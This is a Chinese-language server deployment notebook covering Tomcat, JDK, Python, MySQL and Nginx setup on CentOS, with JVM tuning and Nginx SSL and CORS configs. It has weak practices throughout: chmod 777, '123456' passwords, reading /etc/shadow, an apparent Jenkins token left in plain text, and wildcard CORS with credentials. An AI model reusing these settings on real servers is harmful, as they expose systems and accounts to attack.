修改文件（夹）访问权限：chmod 777 文件

1.5 重启tomcat

cd /home/program/tomcat7-1/

bin/shutdown.sh

使用 ps aux|grep tomcat

查看到tomcat如果项目没有被停止

kill -9 “进程ID”

rm -rf work/*

bin/startup.sh

tail -f logs/catalina.out

或 因为公司服务器对.out 日志做了按天分割

tail -f logs/catalina.2016-05-15.out



如果是我们的服务器，切换root用户命令： sudo -s



### 创建 web 项目专用账户

账户名：web01

密码：123456



需要切换到root

su - 或 su root

useradd web01 -p WEB1_190222

useradd web01



查看系统默认创建的用户信息

grep web01 /etc/passwd /etc/shadow /etc/group

发现账户密码竟然是明文显示!



原因：

-p, --password PASSWORD    encrypted password of the new account

-p参数设置的密码是加密后的密文

使用 passwd 单独设置密码



创建一个web项目专用组，便于公用Java、Tomcat等开发环境

```shell
[root@localhost ~]# groupadd web # 创建web组
[root@localhost ~]# gpasswd web # 设置web组管理员密码
[root@localhost ~]# gpasswd -A web01 web # 设置web群管理员为web01

groupadd web
gpasswd web
gpasswd -A dvlp web # 设置web群管理员为dvlp
gpasswd -a dvlp web # 加入web组
grep web /etc/group # 查看组成员

```



切换web01账户，让web01（自己）加入web01组

```shell
[root@localhost ~]# su web01
[web01@localhost root]$ gpasswd -a web01 web
Adding user web01 to group web
[web01@localhost root]$ grep web /etc/group
web01:x:501:
web:x:502:web01

```



在/usr目录下创建一个web组的公用目录web，组内成员可以自由访问，其他成员没有任何权限

```shell
[root@localhost ~]# mkdir /usr/web
[root@localhost ~]# chgrp web /usr/web
[root@localhost ~]# chmod 2770 /usr/web
[root@localhost ~]# ll -d /usr/web
drwxrws---. 2 root web 4096 Feb 22 02:04 /usr/web

```



### 安装 JDK

#### 商用收费

2019年4月16日当天，Oracle发布了Oracle JDK的8u211和8u212两个版本（属于JDK8系列），并从这两个版本开始将JDK的授权许可从BCL换成了OTN！也就是从这两个版本开始**商用**收费了！



商用收费就是当你使用**Oracle JDK 8u211及以上版本进行具有商业用途(盈利目的)的应用或工具的开发时是要收费的**，这时是要先向Oracle缴费取得授权的！当然，一开始你没缴费取得授权就直接用了，Oracle也是不知道的啦！但当你的产品应用或工具越做越大，越来越有名气和市场影响力时，说不定哪天就收到了Oracle发来的律师函，会搞得你公司不要不要的，甚至破产！



![img](https://www.m1yellow.cn/doc-img/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95.assets/jdk8-version-download.png)



#### 安装与基本操作

【注意】JDK安装在哪个用户下，就是给哪个用户使用，因为用户目录权限，如果不设置权限，其他用户没有权限访问。

可以选择一个共用目录，设置用户组，在这个组的用户都能访问。



参考：

- [Linux系统安装Java环境](https://segmentfault.com/a/1190000038985819)



```shell
# 检查系统内是否已经装有 JDK
java -version
-bash: java: command not found

# 如果已经安装了，也可以不用管，继续安装新的jdk
# 如果想要卸载原来的旧版本
##卸载方式一
卸载centos原本自带的openjdk，运行命令：rpm -qa | grep java
然后通过 rpm -e --nodeps 后面跟系统自带的jdk名 这个命令来删除系统自带的jdk，
例如：
rpm -e --nodeps java-1.8.0-openjdk-1.8.0.102-4.b14.el7.x86_64
rpm -e --nodeps java-1.8.0-openjdk-headless-1.8.0.102-4.b14.el7.x86_64

##卸载方式二
yum list installed | grep java
yum -y remove java-1.7.0-openjdk*
yum -y remove tzdata-java.noarch

过程中如果要访问镜像，可以 ctrl+c中断，卸载的时候，
结果显示为Complete!表示卸载完成!


#下载 jdk，需要注册账户
https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html
# rpm 方式安装
wget https://download.oracle.com/otn/java/jdk/8u271-b09/61ae65e088624f5aaa0b1d2d801acb16/jdk-8u271-linux-x64.rpm
# tar 解压方式安装
wget https://download.oracle.com/otn/java/jdk/8u271-b09/61ae65e088624f5aaa0b1d2d801acb16/jdk-8u271-linux-x64.tar.gz

$ mkdir /usr/java
创建一个 /usr/java 目录

$ cp /root/jdk-8u271-linux-x64.tar.gz /usr/java/
将之前下载的 tar 包拷贝到新建的目录下

$ tar xzf jdk-8u271-linux-x64.tar.gz -C /usr/java

$ vim /etc/profile
打开这个文件之后，按 i 进入到编辑模式，然后找到 export PATH USER LOGNAME MAIL HOSTNAME HISTSIZE HISTCONTRO 这句话，之后另起一行，根据刚刚下载的的 JDK 版本添加以下内容：

# 注意，版本号修改对应自己安装的版本
export JAVA_HOME=/usr/java/jdk1.8.0_281
export CLASSPATH=$JAVA_HOME/lib/tools.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib
export PATH=$JAVA_HOME/bin:$PATH

或者
# JDK
JAVA_HOME=/usr/java/jdk1.8.0_281
JRE_HOME=/usr/java/jdk1.8.0_281/jre
PATH=$JAVA_HOME/bin:$JRE_HOME/bin:$PATH
CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib
export JAVA_HOME JRE_HOME PATH CLASSPATH

然后按 Esc，输入 :wq，保存修改并退出。

$ source /etc/profile
重新读取 profile 配置文件中的内容，让配置生效。

source: command not found。

得切换 root 角色
方法:使用root用户:sudo su 或者sudo -s

此时继续报错

修改完成/etc/profile，使其生效

    source /etc/profile   报错source: command not found。-提示找不到命令

  方法: locate source /etc/profile

此时报错 locate: can not stat () `/var/lib/mlocate/mlocate.db': No such file or directory

方法:执行updatedb 等待几秒后 再次执行source /etc/profile

执行成功


#最后，需要添加软链接
ln -s /usr/java/jdk1.8.0_281/bin/java /usr/bin/java


```



看看自己的配置是否都正确

echo $JAVA_HOME

echo $CLASSPATH

echo $PATH



如果系统已经安装了其他版本的Java，修改为新安装的版本

update-alternatives --install /usr/bin/java java /usr/java/jdk1.8.0_66/bin/java 300

update-alternatives --install /usr/bin/javac javac /usr/java/jdk1.8.0_66/bin/javac 300

update-alternatives --config java

update-alternatives --config javac



java -version看看是否安装成功，成功则显示如下

java version "1.8.0_66"

Java(TM) SE Runtime Environment (build 1.8.0_66-b17)

Java HotSpot(TM) 64-Bit Server VM (build 25.65-b01, mixed mode)



linux每次进入都需要 source /etc/profile才能使用java命令，需要配置永久环境变量，将环境变量追加在~/.bashrc文件末尾,使其永久生效



sudo vim ~/.bashrc

“~”指当前账号的根目录



“.”表示bashrc是隐藏文件，可以用 ls -a 或 ls -la命令看到



将要添加的环境变量加进去

\# java environment

export JAVA_HOME=/usr/web/java/jdk1.7.0_45 

export PATH=$PATH:$JAVA_HOME/bin

export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar


也可以在.bashrc文件中加入source /etc/profile，但这个文件只有root有权限，不针对每一个普通用户

保存，退出。执行命令：source ~/.bashrc



#### 切换 JDK 版本

1. 配置新JDK路径

vi /etc/profile

添加

```
JAVA_HOME=/usr/java/jdk1.7.0_45
CLASSPATH=$JAVA_HOME/lib:$JAVA_HOME/jre/lib
PATH=$PATH:$JAVA_HOME/bin:$JAVA_HOME/jre/bin
export PATH CLASSPATH JAVA_HOME
```



2. 使JDK配置生效

source /etc/profile 

3. 查看java路径

which java

使用update-alternativs 命令可以完成jdk版本切换



具体如下：

\1. 查看相应的jdk是否在 ubuntu的jdk菜单里，查看：

update-alternatives --config java

update-alternatives --config javac 



2.如果没有在菜单里可以如下方式添加：

update-alternatives --install /usr/bin/java java /usr/java/jdk1.7.0_45/bin/java 300

update-alternatives --install /usr/bin/javac javac /usr/java/jdk1.7.0_45/bin/javac 300

 注意：jdk1.6.0_12 版本不同会有变动



3.sudo update-alternatives --config java

sudo update-alternatives --config javac

选择序号，回车即可；

然后java -version,javac -version查看当前jdk版本





### 安装 Python3

- [python在centos下安装以及配置](https://blog.csdn.net/wtt234/article/details/128172281)
- [CentOS 7 安装 Python 3.X版本](https://www.cnblogs.com/Magiclala/p/15474456.html)



#### 查看是否已经安装 Python

Centos7默认安装了python2.7.5 因为一些命令要用它比如yum 它使用的是python2.7.5。

使用python -V命令查看一下是否安装Python：

```py
python -V
Python 2.7.5
```

然后查看Python可执行文件的位置：

```python
which python
/usr/bin/python
```



#### 下载 Python3

官网：https://www.python.org/downloads/source/

> 如果下载速度很慢，可以试用IDM或者迅雷下载

```python
cd ~
wget https://www.python.org/ftp/python/3.11.2/Python-3.11.2.tgz
#解压
tar -zxvf Python-3.11.2.tgz

```



#### 安装

安装相关依赖

```python
sudo yum -y  install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel libffi-devel gcc make

```



创建安装目录 /usr/local/python3.11



配置指定python的安装目录

```python
cd ~/Python-3.11.2
./configure --prefix=/usr/local/python3.11
```



切换到root，sudo会报错

```python
make && make install
```



建立软连接（类似windows的快捷方式）

```python
ln -s /usr/local/python3.11/bin/python3.11 /usr/bin/python3
ln -s /usr/local/python3.11/bin/pip3.11 /usr/bin/pip3
```



配置$PATH环境变量

```python
cd ~
vim .bash_profile

PATH=$PATH:$HOME/.local/bin:$HOME/bin:/usr/local/python3.11/bin

source ~/.bash_profile
```



#### 验证安装

```python
python3 -V
Python 3.11.2
```



#### 配置pip镜像源

```py
su
pip3 config --global set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple/
```



#### pip升级

```py
pip3 install --upgrade pip
```





### 安装 MySQL

注意问题：

MySQL 以普通用户身份启动

```shell


```



查看当前系统中是否已经安装MySQL

[root@localhost ~]# rpm -qa | grep mysql

执行以上命令后没有任何输出，说明没有安装过MySQL



centos6.5默认安装的是mysql5.1



卸载旧版本的mysql5.1

yum list installed | grep mysql 或 rpm -qa | grep mysql

[root@localhost usr]# yum list installed | grep mysql

mysql-libs.x86_64    5.1.71-1.el6  @anaconda-CentOS-201311272149.x86_64/6.5



\#yum remove mysql mysql-server mysql-libs compat-mysql51

yum -y remove mysql-libs.x86_64 或 yum -y remove mysql



/*

查看本机是否安装MySQL

[root@centos data1]# rpm -qa | grep -i mysql

mysql-libs-5.1.71-1.el6.x86_64

卸载旧版本MySQL

[root@centos data1]# rpm -e --nodeps mysql-libs-5.1.71-1.el6.x86_64



卸载旧版本

使用下面的命令检查是否安装有MySQL Server  

rpm -qa | grep mysql

如果有的话通过下面的命令来卸载掉

普通删除模式

rpm -e mysql  

强力删除模式 : 如果使用上面命令删除时，提示有依赖的其它文件，则用该命令可以对其进行强力删除

rpm -e --nodeps mysql  

*/



创建mysql用户和组

groupadd mysql

useradd -r -g mysql mysql -d /usr/local/mysql

passwd mysql

密码：123456



### 安装 Redis

```shell


```





### 安装 Tomcat

```shell
# 查看是否已经安装了 tomcat
systemctl status tomcat.service
# 或者 
systemctl status tomcat

# 下载安装包
cd ~
wget https://mirrors.bfsu.edu.cn/apache/tomcat/tomcat-9/v9.0.46/bin/apache-tomcat-9.0.46.tar.gz

# 解压到自定义安装目录

# 修改 server.xml 端口和项目路径配置
# 具体参考已有的 server.xml 文件


# 部署多个 tomcat
# 端口号建议统一
# tomcat01 -> 8081 8015 8019
# tomcat02 -> 8082 8025 8029
# tomcat03 -> 8083 8035 8039
HTTP端口，默认8080，改为8081
<Connector port="8081" protocol="HTTP/1.1"...

远程停服务端口，默认8005，改为8006
<Server port="8006" shutdown="SHUTDOWN">...

AJP端口，默认8009，改为8010。tomcat9 没有开启，不用管
<Connector port="8010" protocol="AJP/1.3" redirectPort="8443" />

注意：
-XX:SurvivorRatio=n	年轻代中Eden区与两个Survivor区的比值。
-XX:SurvivorRatio=4，设置年轻代中Eden区与Survivor区的大小比值。如果设置为4，那么两个Survivor区与一个Eden区的比值为2:4，一个Survivor区占整个年轻代的1/6。
-XX:SurvivorRatio=6，s0:s1:eden = 1:1:6，可以在 [6,8] 区间内观察
比例理想状态：项目启动创建大量对象，YGC 肯定会发生多次，FGC 最好是 0 次。保证 FGC 次数为0，减少 YGC 次数

-XX:TargetSurvivorRatio=90
设置Survivor区的利用率，默认50。
1) 当一个大对象的内存大于 s0/s1*50，将直接晋升存放到老年代
2) 当 YGC 未能回收的对象内存达到  s0/s1*50 以上，这一批存活对象，不论年龄是否超过 15，直接晋升存放到老年代

可以在JVM启动参数中加上-XX:+PrintTenuringDistribution，该参数可以输出age的额外信息

-XX:CMSInitiatingOccupancyFraction=80，那么在老年代占用率达到80%时触发 CMS FGC


# 单独项目 mypages
JAVA_OPTS="-server -Xms800m -Xmx800m -Xmn480m -XX:MetaspaceSize=300m -XX:MaxMetaspaceSize=300m -XX:CompressedClassSpaceSize=300m -XX:PermSize=300m -XX:MaxPermSize=300m -XX:MaxDirectMemorySize=300m -XX:-UseAdaptiveSizePolicy -XX:SurvivorRatio=4 -XX:TargetSurvivorRatio=90 -XX:+UseConcMarkSweepGC -XX:+UseParNewGC -XX:CMSFullGCsBeforeCompaction=5 -XX:+UseCMSCompactAtFullCollection -XX:+UseCMSInitiatingOccupancyOnly -XX:CMSInitiatingOccupancyFraction=80 -XX:+ExplicitGCInvokesConcurrent -XX:-OmitStackTraceInFastThrow -XX:+PrintCommandLineFlags -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=logs/gc/mypages -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintTenuringDistribution -Xloggc:logs/gc/mypages/gc-%t.log -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=5 -XX:GCLogFileSize=7M"

【补充 GC 日志分析】
MinorGC
MinorGC（或 young GC 或 YGC）日志：
[GC (Allocation Failure) ---- GC 原因
[PSYoungGen: 31744K->2192K (36864K) ] ---- 年轻代总大小
31744K->2200K (121856K), ---- 年轻代和老年代总大小
0.0139308 secs] ---- YGC 耗时
[Times: user=0.05 ---- YGC 用户耗时
sys=0.01, ---- YGC 系统耗时
real=0.01 secs] ---- YGC 实际耗时

FullGC 日志：
[Full GC (Metadata GC Threshold)  ---- GC 原因
[PSYoungGen: 5104K->0K (132096K) ] ---- 年轻代总大小
[Par01dGen: 416K->5453K (50176K) ] ---- 老年代总大小
5520K->5453K (182272K), ---- 年轻代和老年代总大小
[Metaspace: 20637K->20637K (1067008K) ], ---- 方法区总大小
0.0245883 secs] ---- FGC 耗时
[Times: user=0.06 ---- FGC 用户耗时
sys=0.00, ---- FGC 系统耗时
real=0.02 secs] ---- FGC 实际耗时

规律：
[名称: GC前内存占用->GC后内存占用 (该区内存总大小) ]

三个时间：user，sys 和 real
user：进程执行用户态代码（核心之外）所使用的时间。这是执行此进程所使用的实际 CPU 时间，其他进程和此进程阻塞的时间并不包括在内。在垃圾收集的情况下，表示 GC 线程执行所使用的 CPU 总时间。
sys：进程在内核态消耗的 CPU 时间，即在内核执行系统调用或等待系统事件所使用的 CPU 时间
real：程序从开始到结束所用的时钟时间。这个时间包括其他进程使用的时间片和进程阻塞的时间（比如等待 I/O 完成）。对于并行 gc，这个数字应该接近（用户时间＋系统时间）除以垃圾收集器使用的线程数。

由于多核的原因，一般的 GC 事件中，real time 是小于 sys time ＋ user time 的，因为一般是多个线程并发的去做 GC，所以 real time 是要小于 sys ＋ user time 的。如果 real ＞ sys ＋ user 的话，则你的应用可能存在下列问题：IO 负载非常重或 CPU 不够用。

注意：Minor GC 堆内存总容量 = 9/10 年轻代 + 老年代。原因是 Survivor 区只计算 from 部分，而 JVM 默认年轻代中 Eden 区和 Survivor 区的比例关系，Eden:S0:S1=8:1:1。


# 设置 JVM 参数
# jenkins f16941579b0c4b319bee8dfa8f7cc4e9
JAVA_OPTS="-server -Xms800m -Xmx800m -Xmn500m -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=256m -XX:PermSize=128m -XX:MaxPermSize=256m -XX:MaxDirectMemorySize=256m -XX:SurvivorRatio=3 -XX:TargetSurvivorRatio=90 -XX:+UseConcMarkSweepGC -XX:+UseParNewGC -XX:CMSFullGCsBeforeCompaction=5 -XX:+UseCMSCompactAtFullCollection -XX:+UseCMSInitiatingOccupancyOnly -XX:CMSInitiatingOccupancyFraction=70 -XX:+ExplicitGCInvokesConcurrent -XX:-OmitStackTraceInFastThrow -XX:+PrintCommandLineFlags -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCTimeStamps -Xloggc:/home/web/logs/gc/jenkins/gc-%t.log -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=5 -XX:GCLogFileSize=20M"

# 主要业务模块 mypages-admin
JAVA_OPTS="-server -Xms512m -Xmx512m -Xmn300m -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=256m -XX:PermSize=128m -XX:MaxPermSize=256m -XX:MaxDirectMemorySize=256m -XX:SurvivorRatio=3 -XX:TargetSurvivorRatio=90 -XX:+UseConcMarkSweepGC -XX:+UseParNewGC -XX:CMSFullGCsBeforeCompaction=5 -XX:+UseCMSCompactAtFullCollection -XX:+UseCMSInitiatingOccupancyOnly -XX:CMSInitiatingOccupancyFraction=70 -XX:+ExplicitGCInvokesConcurrent -XX:-OmitStackTraceInFastThrow -XX:+PrintCommandLineFlags -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCTimeStamps -Xloggc:/home/web/logs/gc/mypages-admin/gc-%t.log -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=5 -XX:GCLogFileSize=20M"

# 次要业务模块 mypages-god
JAVA_OPTS="-server -Xms256m -Xmx256m -Xmn128m -Xss512K -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=128m -XX:PermSize=128m -XX:MaxPermSize=128m -XX:MaxDirectMemorySize=128m -XX:SurvivorRatio=3 -XX:TargetSurvivorRatio=90 -XX:+UseConcMarkSweepGC -XX:+UseParNewGC -XX:CMSFullGCsBeforeCompaction=5 -XX:+UseCMSCompactAtFullCollection -XX:+UseCMSInitiatingOccupancyOnly -XX:CMSInitiatingOccupancyFraction=70 -XX:+ExplicitGCInvokesConcurrent -XX:-OmitStackTraceInFastThrow -XX:+PrintCommandLineFlags -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCTimeStamps -Xloggc:/home/web/logs/gc/mypages-god/gc-%t.log -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=5 -XX:GCLogFileSize=20M"

# 次要业务模块 mypages-auth
JAVA_OPTS="-server -Xms256m -Xmx256m -Xmn128m -Xss512K -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=128m -XX:PermSize=128m -XX:MaxPermSize=128m -XX:MaxDirectMemorySize=128m -XX:SurvivorRatio=3 -XX:TargetSurvivorRatio=90 -XX:+UseConcMarkSweepGC -XX:+UseParNewGC -XX:CMSFullGCsBeforeCompaction=5 -XX:+UseCMSCompactAtFullCollection -XX:+UseCMSInitiatingOccupancyOnly -XX:CMSInitiatingOccupancyFraction=70 -XX:+ExplicitGCInvokesConcurrent -XX:-OmitStackTraceInFastThrow -XX:+PrintCommandLineFlags -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCTimeStamps -Xloggc:/home/web/logs/gc/mypages-auth/gc-%t.log -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=5 -XX:GCLogFileSize=20M"

# 次要业务模块 mypages-excavation
JAVA_OPTS="-server -Xms256m -Xmx256m -Xmn128m -Xss512K -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=128m -XX:PermSize=128m -XX:MaxPermSize=128m -XX:MaxDirectMemorySize=128m -XX:SurvivorRatio=3 -XX:TargetSurvivorRatio=90 -XX:+UseConcMarkSweepGC -XX:+UseParNewGC -XX:CMSFullGCsBeforeCompaction=5 -XX:+UseCMSCompactAtFullCollection -XX:+UseCMSInitiatingOccupancyOnly -XX:CMSInitiatingOccupancyFraction=70 -XX:+ExplicitGCInvokesConcurrent -XX:-OmitStackTraceInFastThrow -XX:+PrintCommandLineFlags -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCTimeStamps -Xloggc:/home/web/logs/gc/mypages-excavation/gc-%t.log -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=5 -XX:GCLogFileSize=20M"


```



**tomcat 日志切割**

下载LINUX下的小软件cronolog  wget  https://files.cnblogs.com/files/crazyzero/cronolog-1.6.2.tar.gz  建议使用root权限进行按装

解压缩 

  \# tar zxvf cronolog-1.6.2.tar.gz 

进入cronolog安装文件所在目录 

  \# cd cronolog-1.6.2 

运行安装 

  \# ./configure 

  \# make 

  \# make install



成功后 运行which cronolog会找到对应的路径 /usr/local/sbin/cronolog



修改 Tomcat  catalina.sh 文件

![img](https://www.m1yellow.cn/doc-img/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95.assets/tomcat-catalina.sh.png)



修改为

```shell
  shift
  # touch "$CATALINA_OUT"
  if [ "$1" = "-security" ] ; then
    if [ $have_tty -eq 1 ]; then
      echo "Using Security Manager"
    fi
    shift
    eval $_NOHUP "\"$_RUNJAVA\"" "\"$LOGGING_CONFIG\"" $LOGGING_MANAGER $JAVA_OPTS $CATALINA_OPTS \
      -classpath "\"$CLASSPATH\"" \
      -Djava.security.manager \
      -Djava.security.policy=="\"$CATALINA_BASE/conf/catalina.policy\"" \
      -Dcatalina.base="\"$CATALINA_BASE\"" \
      -Dcatalina.home="\"$CATALINA_HOME\"" \
      -Djava.io.tmpdir="\"$CATALINA_TMPDIR\"" \
      org.apache.catalina.startup.Bootstrap "$@" start 2>&1\
      | /usr/local/sbin/cronolog "$CATALINA_BASE"/logs/catalina.%Y-%m-%d.out >> /dev/null &
 
  else
    eval $_NOHUP "\"$_RUNJAVA\"" "\"$LOGGING_CONFIG\"" $LOGGING_MANAGER $JAVA_OPTS $CATALINA_OPTS \
      -classpath "\"$CLASSPATH\"" \
      -Dcatalina.base="\"$CATALINA_BASE\"" \
      -Dcatalina.home="\"$CATALINA_HOME\"" \
      -Djava.io.tmpdir="\"$CATALINA_TMPDIR\"" \
      org.apache.catalina.startup.Bootstrap "$@" start 2>&1\
      | /usr/local/sbin/cronolog "$CATALINA_BASE"/logs/catalina.%Y-%m-%d.out >> /dev/null &
 
  fi

```



### 安装 Nginx

#### 安装与基本操作

- [CentOS 7 安装 Nginx](https://juejin.cn/post/6844904134345228301)



```shell
# yum 安装 nginx 非常简单，就输入一条命令即可。
$ sudo yum -y install nginx   # 安装 nginx
$ sudo yum remove nginx  # 卸载 nginx


yum makecache
#作用：就是把服务器的包信息下载到本地电脑缓存起来，makecache建立一个缓存，以后用install时就在缓存中搜索，提高了速度。

# yum 安装 nginx 可能会出现 "NO PACKAGE NGINX AVAILABLE." 问题
# 因为nginx位于第三方的yum源里面，而不在centos官方yum源里面，安装epel(Extra Packages for Enterprise Linux)
# 安装epel源
yum -y install epel-release

# 再安装NGINX服务
yum -y install nginx


# 使用 yum 进行 Nginx 安装时，Nginx 配置文件在 /etc/nginx 目录下。
$ sudo systemctl enable nginx # 设置开机启动 
$ sudo service nginx start # 启动 nginx 服务
$ sudo service nginx stop # 停止 nginx 服务
$ sudo service nginx restart # 重启 nginx 服务
$ sudo service nginx reload # 重新加载配置，一般是在修改过 nginx 配置文件时使用。


# 防火墙开放80端口
sudo firewall-cmd --zone=public --add-port=80/tcp --permanent
# 重启防火墙
sudo systemctl restart firewalld
# 查看端口是否开放
sudo firewall-cmd --list-port


# 配置文件目录
/etc/nginx

# 项目资源目录
/usr/share/nginx


```



**http 项目，default.conf**

```properties
server {
    listen       80;
    listen  [::]:80;
    server_name  localhost;
    #server_name  8.129.220.131

    #charset koi8-r;
    #access_log  /var/log/nginx/host.access.log  main;

    location / {
        root   /usr/share/nginx/html/mypages-web;
        index  index.html index.htm;
        #try_files $uri $uri/ /index.html;
    }


    # 配置代理，解决跨域问题
    # api 接口跨域
    # ^~是代表某个字符作为开头匹配
    # /api/ 会自动移除
    location /api/ {
    #location ^~ /api/ {
    	add_header 'Access-Control-Allow-Origin' '*'; 
        add_header 'Access-Control-Allow-Credentials' 'true'; 
        #proxy_set_header Host $host;
        #proxy_set_header X-Real-IP $remote_addr;
        #proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        #proxy_set_header X-NginX-Proxy true;
        #proxy_pass http://127.0.0.1:8081/;
        proxy_pass http://192.168.31.147:8081/;
        #rewrite "^/api/(.*)$" /$1 break;
    }

    # 静态资源跨域
    location /static/ {
	# 服务端已经添加了 header 参数
        #add_header 'Access-Control-Allow-Origin' '*';
        #add_header 'Access-Control-Allow-Credentials' 'true';
	
	# 防盗链
	valid_referers server_names *.m1yellow.cn m1yellow.* gitee.* 192.168.137.151 8.129.220.131/ 172.23.199.172/ 43.129.189.39/ 172.19.0.7/ ~\.google\. ~\.baidu\. ~\.github\. ~\.gitee\.;
        if ($invalid_referer) {
            return 403;
            #rewrite ^/ http://www.m1yellow.cn/images/error/403.jpg;
        }
	
        proxy_pass http://192.168.31.147:8081/;
    }


    #error_page  404              /404.html;

    # redirect server error pages to the static page /50x.html
    #
    error_page   500 502 503 504  /50x.html;
    location = /50x.html {
        root   /usr/share/nginx/html;
    }

    # proxy the PHP scripts to Apache listening on 127.0.0.1:80
    #
    #location ~ \.php$ {
    #    proxy_pass   http://127.0.0.1;
    #}

    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
    #
    #location ~ \.php$ {
    #    root           html;
    #    fastcgi_pass   127.0.0.1:9000;
    #    fastcgi_index  index.php;
    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;
    #    include        fastcgi_params;
    #}

    # deny access to .htaccess files, if Apache's document root
    # concurs with nginx's one
    #
    #location ~ /\.ht {
    #    deny  all;
    #}
}

```





#### 配置仅可通过域名访问，禁用IP访问

- [Nginx设置禁止使用IP访问，仅允许使用域名访问](https://www.cnitdog.com/nginx-deny-ip-access.html)



**方法1：**
修改配置文件nginx.conf，在server段里插入正则，代码如下：

```properties
listen 80;
server_name www.cnitdog.com;
if ($host != 'www.cnitdog.com')
{
	return 403;
}
```

**方法2：**

修改配置文件nginx.conf，添加一个server，新加的server（注意是新增，并不是在原有的server基础上修改）代码如下：

```properties
# 禁止IP直接访问
server {
    listen 80 default_server;
    #server_name 43.129.189.39;
    server_name _;
    return 403;
}
server {
    listen 443 default_server;
    server_name _;
    
    # 防止默认配置导致暴漏域名，通过 IP 扫描，浏览器HTTPS访问会在证书里暴漏网站域名
    # nginx 配置避免服务器真实 IP 泄漏，注意 nginx 版本要求 1.19.4 及以上
    # 不用返回 444 了，直接拒绝握手
    ssl_reject_handshake on;
    # return 444;
}

server {
    listen       80;
    #listen  [::]:80;
    server_name  www.m1yellow.cn;

    #charset koi8-r;
    #access_log  /var/log/nginx/host.access.log  main;

    location / {
        root   /usr/share/nginx/html/mypages-web;
        index  index.html index.htm;
        #try_files $uri $uri/ /index.html;
    }
    ...

```



以上两种方法任选其一即可，修改后记得重启nginx服务，重启后可以发现直接使用IP地址访问会跳转到403错误。



#### 安装 SSL 证书

##### 阿里云免费证书

```shell
# 域名添加 DNS 解析
TXT
_dnsauth
2021061500000059n18ug8pfhg9u27av9cxxfef2mlxhtxdbpokxyh91tny8ekve

```



**nginx default.conf**

```properties
# 禁止IP直接访问
server {
    listen 80 default_server;
    #server_name 43.129.189.39;
    server_name _;
    return 403;
}
server {
    listen 443 default_server;
    server_name _;
    
    # 防止默认配置导致暴漏域名，通过 IP 扫描，浏览器HTTPS访问会在证书里暴漏网站域名
    # nginx 配置避免服务器真实 IP 泄漏，注意 nginx 版本要求 1.19.4 及以上
    # 不用返回 444 了，直接拒绝握手
    ssl_reject_handshake on;
    # return 444;
}

# http 重定向到 https
server {
    listen 80;
    server_name m1yellow.cn www.m1yellow.cn;
    #rewrite ^(.*)$ https://www.m1yellow.cn$1 permanent;
    #rewrite ^(.*)$ https://$host$1 permanent;
    # 301 永久重定向可以把搜索引擎的权重全部集中到 https://www.m1yellow.cn
    #return 301 https://$server_name$request_uri;
    return 301 https://www.m1yellow.cn$request_uri;
}
# 重定向到 www
server {
    listen 443;
    server_name m1yellow.cn;
    # 需要证书同时绑定 m1yellow.cn 和 www.m1yellow.cn
    return 301 https://www.m1yellow.cn$request_uri;
    #rewrite ^(.*)$ https://www.m1yellow.cn$1 permanent;
}

# 主配置
server {
    #listen      80;
    listen      443 ssl;
    #listen      443 default_server ssl;
    server_name www.m1yellow.cn;
    
    # ssl证书地址
    ssl_certificate     /etc/nginx/cert/ssl.pem;  # pem文件的路径
    ssl_certificate_key  /etc/nginx/cert/ssl.key; # key文件的路径
    
    # ssl验证相关配置
    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; #表示使用的加密套件的类型
    ssl_protocols TLSv1.1 TLSv1.2 TLSv1.3; #表示使用的TLS协议的类型
    ssl_prefer_server_ciphers on; #使用服务器端的首选算法
    ssl_session_cache shared:SSL:10m; # session 会话缓存有效期
	ssl_session_timeout 10m; # session 会话超时时间
    
    #charset koi8-r;
    #access_log  /var/log/nginx/host.access.log  main;

    location / {
        root   /usr/share/nginx/html/mypages-web;
        index  index.html index.htm;
        #try_files $uri $uri/ /index.html;
    }


    # 配置代理，解决跨域问题
    # api 接口跨域
    # ^~是代表某个字符作为开头匹配
    # /api/ 会自动移除
    location /api/ {
    #location ^~ /api/ {
    	add_header 'Access-Control-Allow-Origin' '*'; 
        add_header 'Access-Control-Allow-Credentials' 'true'; 
        #proxy_set_header Host $host;
        #proxy_set_header X-Real-IP $remote_addr;
        #proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        #proxy_set_header X-NginX-Proxy true;
        #proxy_pass http://127.0.0.1:8081/;
        proxy_pass http://172.23.199.172:8081/;
        #proxy_pass http://172.19.0.7:8081/;
        #rewrite "^/api/(.*)$" /$1 break;
    }

